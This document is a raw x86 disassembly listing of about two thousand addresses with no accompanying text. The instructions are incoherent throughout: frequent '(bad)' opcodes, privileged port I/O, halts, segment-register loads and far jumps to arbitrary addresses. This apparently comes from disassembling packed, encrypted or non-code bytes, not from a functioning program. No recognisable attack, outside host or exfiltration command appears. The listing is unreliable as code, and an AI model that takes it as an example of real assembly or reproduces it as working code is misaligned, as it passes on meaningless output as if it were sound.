  4041a9:	outs   dx,BYTE PTR ds:[esi]
  4041aa:	sbb    cl,cl
  4041ac:	push   edi
  4041ad:	fs adc eax,0x80ba9ab2
  4041b3:	es call edx
  4041b6:	mov    bl,0x68
  4041b8:	ret    0x9baf
  4041bb:	adc    BYTE PTR [ecx],cl
  4041bd:	lds    ebp,FWORD PTR [ecx-0x24]
  4041c0:	mov    ebp,0x8f44bf9b
  4041c5:	or     ch,ch
  4041c7:	push   edx
  4041c8:	sbb    bh,bh
  4041ca:	sub    eax,0x7a840be5
  4041cf:	pop    esp
  4041d0:	mov    BYTE PTR [eax],dl
  4041d2:	and    DWORD PTR [ebx],edi
  4041d4:	mov    eax,DWORD PTR [edx+ecx*2]
  4041d7:	add    al,0xa1
  4041d9:	jns    0x404209
  4041db:	and    DWORD PTR [edx-0x7a],esp
  4041de:	icebp  
  4041df:	xchg   esp,eax
  4041e0:	cmp    al,0x22
  4041e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041e3:	inc    ebp
  4041e4:	pop    ss
  4041e5:	sbb    eax,0x71db3d2d
  4041ea:	stos   BYTE PTR es:[edi],al
  4041eb:	xor    eax,0x36e73697
  4041f0:	xor    ecx,DWORD PTR [ebp+0x2014c37c]
  4041f6:	adc    edi,ebx
  4041f8:	gs add ah,dl
  4041fb:	js     0x40426f
  4041fd:	nop
  4041fe:	clc    
  4041ff:	imul   BYTE PTR ds:0xedfdbac5
  404205:	adc    al,0xd0
  404207:	pop    ax
  404209:	rol    DWORD PTR [ebp-0x8dd527d],cl
  40420f:	sbb    al,0x76
  404211:	push   edx
  404212:	mov    ecx,DWORD PTR [ecx]
  404214:	fiadd  DWORD PTR [ebx+0x6b7f14ac]
  40421a:	jno    0x40423d
  40421c:	imul   edi,DWORD PTR [ebx],0x4f1adade
  404222:	sub    BYTE PTR [ecx+0x46a93774],bl
  404228:	xor    BYTE PTR [ebx-0x328f0e1],0x47
  40422f:	dec    ebp
  404230:	fbld   TBYTE PTR [ebp+0x70fd4c14]
  404236:	repnz add edi,ebp
  404239:	mov    cs,WORD PTR [eax]
  40423b:	icebp  
  40423c:	and    al,0x95
  40423e:	aas    
  40423f:	jl     0x404263
  404241:	out    0x51,al
  404243:	je     0x4041cd
  404245:	ror    DWORD PTR [ebx],1
  404247:	cli    
  404248:	mov    eax,ds:0x314bb94b
  40424d:	adc    DWORD PTR [ebx+edx*1+0x7995c9aa],eax
  404254:	push   ss
  404255:	sub    edi,eax
  404257:	popf   
  404258:	and    DWORD PTR [ebx],eax
  40425a:	leave  
  40425b:	shl    BYTE PTR [esi-0x1e],cl
  40425e:	dec    eax
  40425f:	mov    BYTE PTR [eax-0xa],cl
  404262:	xor    ebp,DWORD PTR ds:0xbc818fcb
  404268:	cli    
  404269:	jecxz  0x40420f
  40426b:	mov    ebx,0xd17364bf
  404270:	test   DWORD PTR [edi],edx
  404272:	sub    dh,ah
  404274:	add    eax,0xe4c968f2
  404279:	ins    BYTE PTR es:[edi],dx
  40427a:	out    dx,al
  40427b:	les    eax,FWORD PTR [eax-0x2806f93a]
  404281:	enter  0x658e,0x8f
  404285:	into   
  404286:	jge    0x40420e
  404288:	in     eax,dx
  404289:	das    
  40428a:	push   es
  40428b:	dec    ebx
  40428c:	adc    BYTE PTR [edx-0x3d6de347],ch
  404292:	or     eax,0xffffffee
  404295:	sbb    BYTE PTR [eax+0x6dec8b1b],bh
  40429b:	jmp    0x7c2e:0xfa75c755
  4042a2:	mov    ds:0x6966b9ec,eax
  4042a7:	fbld   TBYTE PTR [edi]
  4042a9:	aad    0xb3
  4042ab:	pop    ds
  4042ac:	in     al,0x53
  4042ae:	(bad)  
  4042af:	cmc    
  4042b0:	mov    ecx,0x38579d1
  4042b5:	out    dx,eax
  4042b6:	popa   
  4042b7:	arpl   WORD PTR [esi],bp
  4042b9:	lods   eax,DWORD PTR ds:[esi]
  4042ba:	pop    es
  4042bb:	xor    DWORD PTR [eax+0x51bf2fcd],edx
  4042c1:	inc    eax
  4042c2:	(bad)  
  4042c6:	adc    al,0x36
  4042c8:	test   DWORD PTR [esi-0x63],0x77a05e6b
  4042cf:	add    eax,0xd642860b
  4042d4:	xchg   ebx,eax
  4042d5:	pop    ecx
  4042d6:	fistp  QWORD PTR [esi-0x304e7f63]
  4042dc:	ss jae 0x404300
  4042df:	cmp    eax,0x7c40eae7
  4042e4:	mov    DWORD PTR ds:0xb9899ea0,edi
  4042ea:	sahf   
  4042eb:	pop    ss
  4042ec:	sub    al,0x42
  4042ee:	jnp    0x404280
  4042f0:	push   0x95bb1a8
  4042f5:	sbb    ah,ch
  4042f7:	jge    0x40433f
  4042f9:	aam    0xd8
  4042fb:	xor    eax,0xbc734d56
  404300:	pop    edi
  404301:	ficom  DWORD PTR [edx]
  404303:	xchg   edi,eax
  404304:	call   FWORD PTR [ebx-0x56]
  404307:	cli    
  404308:	aaa    
  404309:	jb     0x404305
  40430b:	pop    eax
  40430c:	daa    
  40430d:	scas   al,BYTE PTR es:[edi]
  40430e:	jl     0x40434d
  404310:	inc    edi
  404311:	cmp    eax,0x23ee32a0
  404316:	ins    DWORD PTR es:[edi],dx
  404317:	lock push edx
  404319:	(bad)  
  40431a:	pusha  
  40431b:	mov    ecx,0x5b05a919
  404320:	pop    ebp
  404321:	mov    al,BYTE PTR cs:[edi-0x3539a51f]
  404328:	in     al,0xe7
  40432a:	cmp    eax,0x170c78c8
  40432f:	cwde   
  404330:	mov    ds:0xd417f1d2,al
  404335:	js     0x404348
  404337:	xchg   BYTE PTR [ebp+0x34],ah
  40433a:	ins    DWORD PTR es:[edi],dx
  40433b:	xchg   BYTE PTR [ebx],dl
  40433d:	das    
  40433e:	inc    esi
  40433f:	adc    eax,0xe2101aac
  404344:	ret    0xa767
  404347:	(bad)  
  404348:	out    dx,eax
  404349:	dec    eax
  40434a:	adc    DWORD PTR [edi-0x653b5552],ebx
  404350:	std    
  404351:	ss lock daa 
  404354:	daa    
  404355:	dec    ebp
  404356:	add    DWORD PTR [edi+0x6d646bc],edx
  40435c:	or     al,0x19
  40435e:	sbb    DWORD PTR [ebx-0x4a],0xffffffce
  404362:	xor    esi,0x5a
  404365:	mov    esi,0xf8f044da
  40436a:	mov    edx,0xdc20ec17
  40436f:	push   eax
  404370:	sar    BYTE PTR [eax+0x199a8d1],1
  404376:	mov    ss,WORD PTR ds:0xba078fe8
  40437c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40437d:	popa   
  40437e:	dec    ebp
  40437f:	mov    ebp,?
  404381:	fild   QWORD PTR [edi-0x3f]
  404384:	jg     0x40438e
  404386:	enter  0xdb3b,0x7d
  40438a:	xor    al,0x35
  40438c:	add    esp,DWORD PTR [ebp-0x3d]
  40438f:	sbb    BYTE PTR ds:0xf022e503,dh
  404395:	push   esp
  404396:	adc    al,0xbc
  404398:	xor    eax,0xc567d793
  40439d:	loopne 0x4043fe
  40439f:	sar    DWORD PTR [ebx],1
  4043a1:	sub    bl,BYTE PTR [ebx-0x15]
  4043a4:	dec    ebp
  4043a5:	repnz and esp,0x9569ce5d
  4043ac:	out    dx,al
  4043ad:	or     BYTE PTR [ebx+0x33],cl
  4043b0:	pusha  
  4043b1:	nop
  4043b2:	ss in  eax,0x68
  4043b5:	jno    0x404398
  4043b7:	dec    edx
  4043b8:	fisubr DWORD PTR [edx-0x39]
  4043bb:	data16 int3 
  4043bd:	or     dh,BYTE PTR [ebx-0x51ec5adb]
  4043c3:	jne    0x40440c
  4043c5:	and    ebp,DWORD PTR [ebx]
  4043c7:	std    
  4043c8:	cdq    
  4043c9:	xchg   edx,eax
  4043ca:	jge    0x40439b
  4043cc:	ja     0x404419
  4043ce:	loope  0x404419
  4043d0:	mov    ah,0xeb
  4043d2:	popf   
  4043d3:	pushf  
  4043d4:	mov    esi,DWORD PTR [ebp+0x18aaaf8]
  4043da:	or     al,0xbc
  4043dc:	fwait
  4043dd:	outs   dx,DWORD PTR ds:[esi]
  4043de:	mov    WORD PTR ds:0xcba28544,gs
  4043e4:	or     al,0xfa
  4043e6:	jmp    0x54fd:0x93bd42
  4043ed:	test   DWORD PTR [ebp-0x44804915],ecx
  4043f3:	lods   eax,DWORD PTR ds:[esi]
  4043f4:	sub    edi,ebx
  4043f6:	stc    
  4043f7:	cmp    edi,DWORD PTR ds:0x97547c06
  4043fd:	sub    bh,cl
  4043ff:	cwde   
  404400:	and    edi,DWORD PTR [ebx-0x39]
  404403:	div    BYTE PTR ds:0x26749d4b
  404409:	mov    BYTE PTR [edi+0x5c],bl
  40440c:	cdq    
  40440d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40440e:	in     al,dx
  40440f:	je     0x404394
  404411:	sbb    eax,0xa914b5df
  404416:	test   BYTE PTR ds:0x38366c99,ch
  40441c:	(bad)  
  40441e:	std    
  40441f:	jmp    0x73127ef7
  404424:	push   ds
  404425:	mov    dl,0x15
  404427:	mov    eax,0x49941914
  40442c:	jns    0x4043d3
  40442e:	lahf   
  40442f:	adc    eax,DWORD PTR [esi+0x49173e8f]
  404435:	ins    DWORD PTR es:[edi],dx
  404436:	sub    al,0x94
  404438:	cld    
  404439:	(bad)  
  40443a:	ror    DWORD PTR [edi-0x767b8284],cl
  404440:	or     eax,0x4b23953c
  404445:	push   0xffffff88
  404447:	cmp    eax,0xb4208e7c
  40444c:	and    bl,BYTE PTR [ecx]
  40444e:	pop    esp
  40444f:	jbe    0x4043d7
  404451:	xchg   esi,eax
  404452:	popf   
  404453:	mov    edx,0xb6046efb
  404458:	cs js  0x404400
  40445b:	in     al,0xb9
  40445d:	fst    DWORD PTR [ebx]
  40445f:	push   es
  404460:	or     al,0x7d
  404462:	mov    al,ds:0xbfed63b4
  404467:	pop    ebx
  404468:	or     eax,0xc026b57
  40446d:	(bad)  
  40446e:	stos   DWORD PTR es:[edi],eax
  40446f:	inc    edi
  404470:	test   eax,0xe7a603f1
  404475:	or     DWORD PTR [ecx+eax*2-0x1d],ebp
  404479:	call   0xd9b3163a
  40447e:	les    ebx,FWORD PTR [edi-0x7066f14f]
  404484:	outs   dx,BYTE PTR ds:[esi]
  404485:	fmul   QWORD PTR [edx]
  404487:	pop    es
  404488:	jnp    0x40446a
  40448a:	fidivr DWORD PTR [esp+edi*2-0x58]
  40448e:	push   edx
  40448f:	add    BYTE PTR [ebx],ch
  404491:	inc    edi
  404492:	fwait
  404493:	mul    esi
  404495:	jno    0x4044a9
  404497:	outs   dx,DWORD PTR ds:[esi]
  404498:	adc    eax,0xe20f80c8
  40449d:	or     dh,BYTE PTR [edx-0x7f]
  4044a0:	xchg   ecx,eax
  4044a1:	pop    ebx
  4044a2:	lock push esp
  4044a4:	jb     0x4044bb
  4044a6:	adc    eax,0xf9ad5153
  4044ab:	call   0x8b54:0x3d929386
  4044b2:	sbb    DWORD PTR [ebx],esp
  4044b4:	scas   eax,DWORD PTR es:[edi]
  4044b5:	xlat   BYTE PTR ds:[ebx]
  4044b6:	cmp    al,0xa0
  4044b8:	and    BYTE PTR [ebx-0x16effa4b],bh
  4044be:	mov    ch,0xe4
  4044c0:	(bad)  
  4044c1:	mov    al,0xa5
  4044c3:	jnp    0x404522
  4044c5:	xchg   BYTE PTR gs:[ebx-0xe288719],al
  4044cc:	jmp    0xa5847915
  4044d1:	sub    al,0x80
  4044d3:	pop    ss
  4044d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d5:	mov    edi,0x7c942344
  4044da:	pop    ebp
  4044db:	icebp  
  4044dc:	loope  0x4044d3
  4044de:	outs   dx,BYTE PTR ds:[esi]
  4044df:	sub    eax,0xb9966b04
  4044e4:	push   ds
  4044e5:	cmp    BYTE PTR [esi-0x4b],dh
  4044e8:	fstp   TBYTE PTR [edx+0x5cf45aa5]
  4044ee:	cmp    ecx,eax
  4044f0:	inc    ebp
  4044f1:	test   bl,al
  4044f3:	int3   
  4044f4:	xchg   eax,esi
  4044f6:	fsub   QWORD PTR [edx+edx*1+0x2a40a239]
  4044fd:	aas    
  4044fe:	in     eax,dx
  4044ff:	jge    0x40450d
  404501:	push   0x3
  404503:	inc    esi
  404504:	push   ecx
  404505:	mov    ecx,0xa6bb46f
  40450a:	imul   ebx,ebx,0xbf9a4027
  404510:	(bad)  
  404511:	icebp  
  404512:	add    dl,BYTE PTR [esp+ebp*4-0x3c]
  404516:	rep lods eax,DWORD PTR ds:[esi]
  404518:	lahf   
  404519:	pop    esi
  40451a:	jbe    0x404525
  40451c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451d:	shl    DWORD PTR [edx+0xb7ecf1a],cl
  404523:	inc    edx
  404524:	jg     0x40458c
  404526:	clc    
  404527:	(bad)  
  404528:	imul   eax,DWORD PTR [ebx+ecx*8-0x6f1531bb],0x4d
  404530:	jecxz  0x404529
  404532:	in     al,0x2e
  404534:	jne    0x4044c1
  404536:	adc    DWORD PTR [eax],esp
  404538:	pop    ds
  404539:	add    esi,ecx
  40453b:	adc    dl,BYTE PTR [ecx]
  40453d:	sbb    DWORD PTR [edx-0x47a09a3e],eax
  404543:	cmp    cl,BYTE PTR [ebx]
  404545:	std    
  404546:	xor    bh,BYTE PTR [ecx]
  404548:	xor    ebp,DWORD PTR [ebx]
  40454a:	hlt    
  40454b:	data16 mov dl,dh
  40454e:	push   0x78
  404550:	fs cdq 
  404552:	push   ebp
  404553:	fcomp  QWORD PTR [esi+0x2a158545]
  404559:	lea    ecx,[edx-0x8]
  40455c:	dec    ebp
  40455d:	pop    ss
  40455e:	push   edx
  40455f:	add    ebp,DWORD PTR [edx+0xe]
  404562:	push   eax
  404563:	and    dl,al
  404565:	cmp    eax,0xb8e91693
  40456a:	mov    al,ds:0xb81b356c
  40456f:	pop    ecx
  404570:	push   es
  404571:	dec    ebx
  404572:	cdq    
  404573:	retf   0x5ec7
  404576:	jb     0x4045da
  404578:	mov    ecx,ecx
  40457a:	xchg   esp,eax
  40457b:	mov    ah,0x66
  40457d:	ret    0xc30b
  404580:	imul   edx
  404582:	jg     0x4045eb
  404584:	mov    dh,0x12
  404586:	(bad)  
  404587:	ins    DWORD PTR es:[edi],dx
  404588:	loope  0x4045a6
  40458a:	(bad)  [ecx+ecx*4]
  40458d:	sub    ecx,0x9179a939
  404593:	push   ds
  404594:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404596:	imul   esp,DWORD PTR [esi],0x7f97cbdb
  40459c:	scas   al,BYTE PTR es:[edi]
  40459d:	out    0xf8,eax
  40459f:	jnp    0x404587
  4045a1:	adc    BYTE PTR [edi],cl
  4045a3:	sub    BYTE PTR [eax+0x55],dl
  4045a6:	adc    dl,al
  4045a8:	or     DWORD PTR [edi+0xb],ebx
  4045ab:	pushf  
  4045ac:	shl    BYTE PTR [esi+0x20],0xda
  4045b0:	lock pop ds
  4045b2:	jl     0x404566
  4045b4:	in     eax,dx
  4045b5:	lea    esi,[edx]
  4045b7:	in     eax,0xa1
  4045b9:	out    0xb4,al
  4045bb:	shl    BYTE PTR [eax+0x66cab2c2],1
  4045c1:	retf   
  4045c2:	test   al,0x85
  4045c4:	ret    0x10f
  4045c7:	adc    al,0x8
  4045c9:	xor    DWORD PTR [esi-0x1d],0xffffffd4
  4045cd:	sub    eax,DWORD PTR [eax]
  4045cf:	dec    esp
  4045d0:	or     eax,0x1ff3a2d5
  4045d5:	xchg   esi,eax
  4045d6:	out    0x80,eax
  4045d8:	test   edx,0x6cddc2b4
  4045de:	ss into 
  4045e0:	cmp    eax,0x5897365
  4045e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045e7:	cmp    ebp,edx
  4045e9:	jmp    0x637db70d
  4045ee:	dec    ebx
  4045ef:	rcl    DWORD PTR [ebp-0xe],1
  4045f2:	fisttp QWORD PTR [edx-0x7f05ea6a]
  4045f8:	xchg   edx,eax
  4045f9:	jge    0x4045f7
  4045fb:	mov    cl,0xb0
  4045fd:	xchg   BYTE PTR [ecx+edi*8-0x79d7b3c6],dl
  404604:	loop   0x4045db
  404606:	retf   0x500e
  404609:	fnstcw WORD PTR [ecx-0x38]
  40460c:	or     bl,BYTE PTR [edi]
  40460e:	and    al,0x1
  404610:	test   al,0x27
  404612:	adc    al,BYTE PTR [edx+0x3f]
  404615:	neg    DWORD PTR fs:[edi]
  404618:	and    eax,DWORD PTR [eax]
  40461a:	(bad)  
  40461b:	mov    al,ds:0x29157ffd
  404620:	stc    
  404621:	mov    dh,dl
  404623:	mov    al,al
  404625:	shl    BYTE PTR [ebp+0x20],0x8
  404629:	ja     0x4045c7
  40462b:	out    0x34,eax
  40462d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40462e:	ficomp DWORD PTR [ecx]
  404630:	das    
  404631:	leave  
  404632:	adc    BYTE PTR [ebp+0x6dc0118e],ch
  404638:	mov    eax,ds:0x34d50656
  40463d:	or     edx,DWORD PTR [ebp-0x2b]
  404640:	and    al,ch
  404642:	cmp    al,al
  404644:	jne    0x4045ed
  404646:	xchg   esp,eax
  404647:	and    al,0x6a
  404649:	push   0x110915a3
  40464e:	test   eax,0x69f49b99
  404653:	fbstp  TBYTE PTR [edx*4+0x2cc7878b]
  40465a:	(bad)  [edi-0x1a]
  40465d:	pop    eax
  40465e:	cmp    al,0x4a
  404660:	mov    ch,0xe3
  404662:	repz push cs
  404664:	rol    BYTE PTR [ebx+edx*4],1
  404667:	loopne 0x4046a8
  404669:	fnstsw WORD PTR [ecx+eiz*2]
  40466c:	out    dx,eax
  40466d:	call   0x938e:0x7e9027a1
  404674:	mov    edx,0x9317f61
  404679:	jge    0x404619
  40467b:	mov    dh,0xaa
  40467d:	push   ecx
  40467e:	jl     0x4046e3
  404680:	xchg   esi,eax
  404681:	(bad)  
  404682:	push   eax
  404683:	or     DWORD PTR [ecx+0x6dba1b27],eax
  404689:	push   edx
  40468a:	mov    dl,0xf0
  40468c:	aad    0xca
  40468e:	jnp    0x404657
  404690:	cmp    BYTE PTR [esi-0x508306d2],bl
  404696:	(bad)  
  404697:	push   edi
  404698:	hlt    
  404699:	adc    eax,0x7a4d048f
  40469e:	jmp    0x4046b1
  4046a0:	dec    eax
  4046a1:	sub    al,0x7
  4046a3:	jne    0x404676
  4046a5:	scas   al,BYTE PTR es:[edi]
  4046a6:	push   esp
  4046a7:	cmc    
  4046a8:	sahf   
  4046a9:	fcomp  st(4)
  4046ab:	push   ebx
  4046ac:	cmp    BYTE PTR [esi+0x1bad3487],bl
  4046b2:	xor    BYTE PTR [ebx+edx*2],al
  4046b5:	pop    ebx
  4046b6:	cmp    bl,dh
  4046b8:	inc    esp
  4046b9:	jge    0x404722
  4046bb:	add    al,0xd6
  4046bd:	xchg   DWORD PTR [ecx],esi
  4046bf:	mov    ch,0x4a
  4046c1:	mov    eax,ds:0x41a1248c
  4046c6:	sar    BYTE PTR [edx+0x7f99696e],1
  4046cc:	shl    BYTE PTR [ebx],cl
  4046ce:	leave  
  4046cf:	xchg   esp,eax
  4046d0:	fnstsw WORD PTR [ebx]
  4046d2:	lock sub al,0x6e
  4046d5:	out    0x96,eax
  4046d7:	inc    ebp
  4046d8:	bound  esi,QWORD PTR [ecx+0x61]
  4046db:	inc    esp
  4046dc:	pop    ecx
  4046dd:	fist   WORD PTR [eax-0x5c]
  4046e0:	xchg   ebx,eax
  4046e1:	(bad)  
  4046e2:	dec    ebx
  4046e3:	outs   dx,BYTE PTR ds:[esi]
  4046e4:	sti    
  4046e5:	pop    ss
  4046e6:	add    DWORD PTR [edi+0x3c3fd8b6],esp
  4046ec:	in     eax,dx
  4046ed:	js     0x40470a
  4046ef:	lds    eax,FWORD PTR [esi+0x5fa1924]
  4046f5:	cmp    DWORD PTR [eax],ecx
  4046f7:	xchg   BYTE PTR [ebx],bl
  4046f9:	pushf  
  4046fa:	movsx  edi,BYTE PTR [edx]
  4046fd:	pop    edx
  4046fe:	or     BYTE PTR [ebx+0x25],dh
  404701:	mov    DWORD PTR [ebx],edx
  404703:	jne    0x4046ee
  404705:	push   edx
  404706:	or     al,0xb4
  404708:	int3   
  404709:	adc    al,0xb5
  40470b:	data16 mov cl,0x8f
  40470e:	fwait
  40470f:	xor    edi,DWORD PTR [ecx-0x6424552e]
  404715:	addr16 jno 0x404775
  404718:	push   ebp
  404719:	sar    DWORD PTR [edx-0x6d93437d],1
  40471f:	loop   0x4046ca
  404721:	dec    esp
  404722:	jmp    0xe492bd8b
  404727:	and    edi,0x53
  40472a:	mov    bl,BYTE PTR [ecx+0x21798c8a]
  404730:	int3   
  404731:	jge    0x404759
  404733:	mov    ch,0x50
  404735:	sub    eax,0xc36f875f
  40473a:	cmp    esi,DWORD PTR [edx-0x6c]
  40473d:	inc    eax
  40473e:	dec    edx
  40473f:	icebp  
  404740:	mov    al,0x1d
  404742:	lods   al,BYTE PTR ds:[esi]
  404743:	and    BYTE PTR [ebx+esi*4-0x55],0x4a
  404748:	inc    edx
  404749:	sbb    DWORD PTR [eax],ecx
  40474b:	jno    0x404717
  40474d:	mov    esi,0x3034bbd3
  404752:	pop    es
  404753:	jbe    0x4046fd
  404755:	mov    BYTE PTR [edx],0x1e
  404758:	xor    BYTE PTR [ebx+0x67],bh
  40475b:	daa    
  40475c:	or     DWORD PTR [ebx-0x41d366f],esp
  404762:	lea    ebx,[ebp+0xa1416b8]
  404768:	call   0x1d8a:0x96f155b0
  40476f:	cmp    eax,0xe2e34df0
  404774:	push   0x31f0a5ad
  404779:	sub    esi,ecx
  40477b:	mov    ds:0xe75fbf1b,al
  404780:	pop    ss
  404781:	call   0xb68bfc0a
  404786:	loope  0x404745
  404788:	mov    BYTE PTR [eax-0xd],dl
  40478b:	mov    ebp,0x79f31bdf
  404790:	in     eax,0x75
  404792:	sub    ebp,DWORD PTR [esi+ebx*1-0x202a5117]
  404799:	sub    DWORD PTR ds:0x4ed828e8,esi
  40479f:	dec    ecx
  4047a0:	xor    al,0x19
  4047a2:	mov    ds:0x6eebf4e1,eax
  4047a7:	popf   
  4047a8:	jmp    0x96e5:0x1ca7d101
  4047af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b0:	inc    ecx
  4047b1:	rcr    BYTE PTR [ecx],1
  4047b3:	dec    ebx
  4047b4:	fidiv  WORD PTR [esi]
  4047b6:	jg     0x404772
  4047b8:	loopne 0x40476d
  4047ba:	add    al,0x4f
  4047bc:	cs cmp al,0x5b
  4047bf:	mov    esp,esp
  4047c1:	xor    DWORD PTR ds:0x756af36c,eax
  4047c7:	fidivr DWORD PTR [edx+0x598f0b84]
  4047cd:	xor    DWORD PTR [eax],0xffffffe1
  4047d0:	push   ebp
  4047d1:	sbb    edi,DWORD PTR [ebx]
  4047d3:	test   eax,edx
  4047d5:	sbb    eax,0x114c2987
  4047da:	sbb    eax,0xd4d64faf
  4047df:	add    ebp,ebp
  4047e1:	mov    BYTE PTR [eax],0x5d
  4047e4:	mov    cl,0x73
  4047e6:	jp     0x40484f
  4047e8:	xor    eax,0xa7b9d22d
  4047ed:	lahf   
  4047ee:	ins    BYTE PTR es:[edi],dx
  4047ef:	xchg   ebx,eax
  4047f0:	pop    edx
  4047f1:	(bad)  
  4047f2:	jns    0x40486c
  4047f4:	jmp    0x1245f408
  4047f9:	xchg   ecx,eax
  4047fa:	cld    
  4047fb:	sahf   
  4047fc:	mov    al,0xb6
  4047fe:	push   es
  4047ff:	inc    ecx
  404800:	int3   
  404801:	adc    edi,DWORD PTR [edi-0x2344e727]
  404807:	cwde   
  404808:	mov    al,0x36
  40480a:	shl    BYTE PTR [edx+0x6ee25b5f],0x7e
  404811:	adc    al,0x7d
  404813:	jp     0x4047ce
  404815:	xadd   ch,cl
  404818:	add    ah,ah
  40481a:	xchg   ebp,eax
  40481b:	lods   eax,DWORD PTR ds:[esi]
  40481c:	scas   eax,DWORD PTR es:[edi]
  40481d:	and    BYTE PTR [edx-0x652ff1fe],dh
  404823:	out    0xb2,al
  404825:	fidivr DWORD PTR ds:[edx+0x3e]
  404829:	dec    ecx
  40482a:	add    edx,DWORD PTR [esi]
  40482c:	cdq    
  40482d:	mov    esp,0xeed34527
  404832:	xchg   ecx,eax
  404833:	or     bx,sp
  404836:	cs pop ss
  404838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404839:	or     al,0x1c
  40483b:	adc    al,0x75
  40483d:	and    al,0xc3
  40483f:	mov    bl,0x23
  404841:	test   DWORD PTR [edx+0x6d08c69e],ebx
  404847:	repz or eax,0x57aa001e
  40484d:	jns    0x4048bc
  40484f:	ret    0xa3f7
  404852:	call   0x4086b9c1
  404857:	sbb    BYTE PTR [ebp+0x66],dl
  40485a:	sbb    BYTE PTR [eax-0x2b],bh
  40485d:	je     0x4048c0
  40485f:	lock add al,0xc
  404862:	arpl   WORD PTR [edx],dx
  404864:	(bad)  
  404865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404866:	jecxz  0x4048c9
  404868:	daa    
  404869:	dec    esi
  40486a:	adc    eax,0xd324fab2
  40486f:	cmc    
  404870:	sbb    al,0x8d
  404872:	imul   DWORD PTR [esi]
  404874:	popf   
  404875:	cli    
  404876:	enter  0x34a6,0x8f
  40487a:	xchg   edi,eax
  40487b:	shl    BYTE PTR ss:[edx+0x1f],0x2a
  404880:	jmp    0x9700:0x86c6746d
  404887:	(bad)  
  404889:	mov    edx,0x49fddd1a
  40488e:	jnp    0x4048fe
  404890:	pop    ebp
  404891:	mov    DWORD PTR [ecx-0x7b],edi
  404894:	stos   BYTE PTR es:[edi],al
  404895:	xor    dh,0x60
  404898:	xchg   ebp,eax
  404899:	out    dx,al
  40489a:	loop   0x404885
  40489c:	das    
  40489d:	pop    ebx
  40489e:	pop    ecx
  40489f:	mov    WORD PTR [edx+ebx*8-0x7e],es
  4048a3:	jg     0x404849
  4048a5:	push   ss
  4048a6:	pushf  
  4048a7:	pushf  
  4048a8:	pop    eax
  4048a9:	hlt    
  4048aa:	jecxz  0x4048d0
  4048ac:	cmp    eax,0x74c4a9dc
  4048b1:	cmp    ebp,eax
  4048b3:	or     ebx,eax
  4048b5:	jbe    0x40484d
  4048b7:	int3   
  4048b8:	das    
  4048b9:	adc    dl,BYTE PTR [ebx+ebx*1]
  4048bc:	adc    ecx,DWORD PTR [ebx-0xf82c93b]
  4048c2:	aas    
  4048c3:	ss aas 
  4048c5:	rcr    edx,1
  4048c7:	fwait
  4048c8:	out    dx,eax
  4048c9:	mov    ecx,ebp
  4048cb:	mov    al,ds:0x524792e2
  4048d0:	inc    ebp
  4048d1:	shr    eax,cl
  4048d3:	addr16 loop 0x404861
  4048d6:	sbb    ebx,DWORD PTR ds:0xdd5e26c8
  4048dc:	or     eax,0x6f4fa4c6
  4048e1:	icebp  
  4048e2:	pop    ds
  4048e3:	popf   
  4048e4:	in     eax,0x9
  4048e6:	(bad)  
  4048e7:	mov    eax,ds:0x9e869588
  4048ec:	sub    bl,BYTE PTR ds:0x9239651e
  4048f2:	cmp    BYTE PTR [edi+eiz*1-0x306faf6b],0x81
  4048fa:	lea    ebp,[eax+0x3425b25c]
  404900:	sub    al,0xea
  404902:	dec    esi
  404903:	xor    dh,BYTE PTR [edx-0x21]
  404906:	aas    
  404907:	and    edx,ebp
  404909:	inc    ebp
  40490a:	jmp    0x8a0a294d
  40490f:	mov    ah,BYTE PTR [eax]
  404911:	cs call 0x8bbd:0x460f43eb
  404919:	mov    bh,0x8b
  40491b:	call   DWORD PTR [edi+0x6b]
  40491e:	in     eax,0x25
  404920:	sbb    al,0x84
  404922:	mov    dl,BYTE PTR [bx+di]
  404925:	fisttp WORD PTR [edi-0x5a]
  404928:	fbstp  TBYTE PTR [edx]
  40492a:	xchg   BYTE PTR [ecx+0x783ebbc8],al
  404930:	xchg   edi,eax
  404931:	in     eax,dx
  404932:	fwait
  404933:	in     al,dx
  404934:	jle    0x404999
  404936:	inc    edi
  404937:	add    BYTE PTR [edi+0x5cb03f00],bh
  40493d:	out    dx,eax
  40493e:	std    
  40493f:	not    ebx
  404941:	popa   
  404942:	pop    edx
  404943:	repnz or ecx,DWORD PTR [edx]
  404946:	call   0x32f7a080
  40494b:	ficomp DWORD PTR [edx+0x6c7c1211]
  404951:	push   edi
  404952:	xchg   esp,eax
  404953:	mov    ebp,0x73130e20
  404958:	movq   QWORD PTR [edi],mm4
  40495b:	sub    BYTE PTR [edx-0x5d],bh
  40495e:	jmp    0x17c702fe
  404963:	jns    0x404926
  404965:	jno    0x4048ed
  404967:	addr16 mov esp,0xde752be6
  40496d:	fisttp WORD PTR [esi-0x5bc0fdfb]
  404973:	lods   eax,DWORD PTR ds:[esi]
  404974:	les    edi,FWORD PTR [edi-0x74]
  404977:	cmc    
  404978:	lock mov eax,DWORD PTR [ebx]
  40497b:	(bad)  
  40497d:	gs jb  0x40497d
  404980:	mov    ebx,0x75491416
  404985:	sub    edx,DWORD PTR [esi+0xe]
  404988:	(bad)  [eax]
  40498a:	or     BYTE PTR [edi],al
  40498c:	inc    edi
  40498d:	push   ss
  40498e:	sets   BYTE PTR [ecx+0x4ba4f8c2]
  404995:	das    
  404996:	pop    edx
  404997:	imul   edi,DWORD PTR [ebx+0x3f],0x37
  40499b:	push   ds
  40499c:	inc    edx
  40499d:	loop   0x404960
  40499f:	(bad)  
  4049a1:	(bad)  [edi]
  4049a3:	sbb    eax,0x4b2eb3a
  4049a8:	xor    DWORD PTR [esi-0x6bca3710],ebx
  4049ae:	ins    DWORD PTR es:[edi],dx
  4049af:	int    0xb3
  4049b1:	icebp  
  4049b2:	mov    al,ds:0x5a4382f6
  4049b7:	jne    0x404a37
  4049b9:	inc    ecx
